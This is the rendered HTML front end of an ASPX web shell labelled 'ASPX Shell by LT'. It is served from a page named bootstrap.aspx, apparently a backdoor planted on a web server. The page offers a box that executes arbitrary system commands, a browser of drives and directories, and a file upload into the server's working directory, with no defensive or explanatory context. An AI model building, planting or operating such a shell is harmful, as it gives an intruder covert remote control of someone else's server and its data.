


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	</style>
</head>
<body>
	<h1>ASPX Shell by LT</h1>
    <form method="post" action="./bootstrap.aspx" id="form1" enctype="multipart/form-data">
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="wgM1Ijd/8z3ZkLv6JiaEwpXggq53akVZ61y7JTfUHae0+5WCMo1vpZfPM8sKdmTVbRL8E6LWsH4CkcgZAC9edaq5SsQ9Zt2cmiyAzzi6jnA=" />
</div>

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="28D328C6" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="r5dMmDM6moqp47A9eURVs2Kn7UfcIHRKiunxTaVH0MD8QfJVlKn9jhixhXMitXd29DfIJPFCwkKLhu/s5GcGAlLns8AY17kHwaJvnFPoAEbkrvx+yF/PZFifszn2W5kx2RE+xUwEADXfqZflPvChAghKLXu1yAPAlkDJvKRcpyw=" />
</div>
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<input name="txtCmdIn" type="text" id="txtCmdIn" style="width:300px;" />
				<input type="submit" name="cmdExec" value="Execute" id="cmdExec" />
				<pre></pre>
			</td>
			<td style="width: 50%; vertical-align: top;">
				<h2>File Browser</h2>
				<p>
					Drives:<br />
					
				</p>
				<p>
					Working directory:<br />
					<b></b>
				</p>
				<table style="width: 100%">
					<tr>
						<th>Name</th>
						<th>Size KB</th>
						<th style="width: 50px">Actions</th>
					</tr>
					
				</table>
				<p>Upload to this directory:<br />
				<input type="file" name="flUp" id="flUp" />
				<input type="submit" name="cmdUpload" value="Upload" id="cmdUpload" />
				</p>
			</td>
		</tr>
    </table>

    </form>
</body>
</html>
